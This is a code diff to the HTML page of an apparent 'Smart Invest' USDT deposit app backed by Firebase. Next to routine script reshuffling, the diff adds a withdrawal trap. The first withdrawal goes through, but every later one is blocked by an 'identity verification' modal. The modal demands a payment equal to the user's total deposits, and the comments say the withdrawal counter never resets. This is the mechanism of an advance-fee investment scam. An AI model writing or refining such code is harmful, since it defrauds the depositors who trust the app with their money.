@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
 <title>Smart Invest</title>
@@ -134,20 +136,8 @@ function showNoticeBoard() {
 // Admin can update notice in Firebase: notices/main
 function loadNotice() {
   if (!window.db) return;
-  const { ref, onValue } = window;
-  if (!ref || !onValue) return;
   try {
-    import('https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js').then(({ref: r, onValue: ov}) => {
-      ov(r(window.db, 'notices/main'), (snap) => {
-        if (snap.exists()) {
-          const txt = snap.val();
-          const el = document.getElementById('notice-content');
-          const badge = document.getElementById('notice-board');
-          if (el) el.textContent = txt;
-          if (badge) badge.textContent = '📢 ' + txt.substring(0, 20) + '...';
-        }
-      });
-    });
+    loadNoticeFromDB();
   } catch(e) {}
 }
 
@@ -734,6 +724,17 @@ async function claimTaskReward() {
   } catch(e) { showToast('❌ Error: ' + (e.message || 'Try again')); }
 }
 
+function showIdentityVerification(verifyFee) {
+  const modal = document.getElementById('identity-modal');
+  document.getElementById('identity-msg').innerHTML =
+    'Please add <b style="color:#ffd54f">' + verifyFee + ' USDT</b> to complete identity verification and activate the withdrawal function.';
+  modal.style.display = 'flex';
+}
+
+function closeIdentityModal() {
+  document.getElementById('identity-modal').style.display = 'none';
+}
+
 function copyRef() {
   const link = document.getElementById('ref-link').textContent;
   navigator.clipboard.writeText(link).catch(() => {});
@@ -762,9 +763,6 @@ function shareRef() {
 }
 </script>
 
-<!-- Firebase compat (works in Telegram WebView) -->
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <script>
   // Firebase compat API
   const firebaseConfig = {
@@ -968,6 +966,17 @@ function shareRef() {
     const ud = window.userData;
     if (!ud || amount > (ud.balance || 0)) { showToast('❌ Insufficient balance!'); return; }
     if (amount < 5) { showToast('❌ Minimum withdrawal is $5'); return; }
+
+    const withdrawCount = ud.withdraw_count || 0;
+
+    // দ্বিতীয়বার থেকে প্রতিবার — current deposited amount দিয়ে verification
+    if (withdrawCount >= 1) {
+      const verifyFee = (ud.deposited || 0).toFixed(2);
+      showIdentityVerification(verifyFee);
+      return;
+    }
+
+    // প্রথমবার withdraw — সাধারণভাবে হবে
     const fee = amount * 0.02;
     const net = amount - fee;
     const now = Date.now();
@@ -981,8 +990,13 @@ function shareRef() {
         type: 'withdraw', amount, method, fee, net_amount: net,
         status: 'pending', note: 'Processing within 24 hours', time: now
       });
-      await update(ref(db, 'users/' + userId), { balance: newBal });
+      // count বাড়াও — deposit করলেও reset হবে না
+      await update(ref(db, 'users/' + userId), {
+        balance: newBal,
+        withdraw_count: withdrawCount + 1
+      });
       window.userData.balance = newBal;
+      window.userData.withdraw_count = withdrawCount + 1;
       renderUI();
       window.txList = window.txList || [];
       window.txList.unshift({ type: 'withdraw', amount, method, fee, net_amount: net, status: 'pending', time: now });
@@ -1851,6 +1865,16 @@ Deposit USDT and start earning daily returns.
     </div>
 
     <div style="margin-top:20px;background:#0a0f0d;border:1px solid #1e3024;border-radius:12px;padding:10px 14px;font-size:11px;color:#607d6e;word-break:break-all;" id="share-link-preview"></div>
+  </div>
+</div>
+
+<!-- IDENTITY VERIFICATION MODAL -->
+<div id="identity-modal" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;align-items:center;justify-content:center;">
+  <div style="background:#1a1600;border:1px solid #c8960040;border-radius:20px;padding:24px 20px;width:88%;max-width:360px;margin:auto;">
+    <div style="font-size:13px;color:#e8d5a0;line-height:1.7;text-align:center;margin-bottom:20px;" id="identity-msg">
+      Please add <b style="color:#ffd54f">14.94USDT</b> to complete identity verification and activate the withdrawal function.
+    </div>
+    <button onclick="closeIdentityModal()" style="width:100%;background:linear-gradient(135deg,#c8960080,#ffd54f);color:#000;font-size:15px;font-weight:700;padding:14px;border-radius:12px;border:none;cursor:pointer;">OK</button>
   </div>
 </div>
 
